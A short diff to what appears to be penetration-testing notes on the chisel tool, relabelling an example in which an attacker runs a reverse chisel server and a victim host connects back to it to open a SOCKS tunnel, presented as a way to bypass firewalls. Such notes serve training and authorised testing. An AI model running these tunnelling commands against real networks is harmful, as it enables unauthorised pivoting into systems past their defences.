@@ -19,10 +19,11 @@ Attacker (Kali, 1.1.1.1)
 - Suitable for **bypassing firewalls**, if it uses standard web ports (80, 443).
 
 **Example command:**
-On the server (attacker):
+On the attacker:
 ```
 chisel server --port 8080 --reverse
 ```
+
 On the victim:
 ```
 chisel client <SERVER_IP>:8080 R:socks
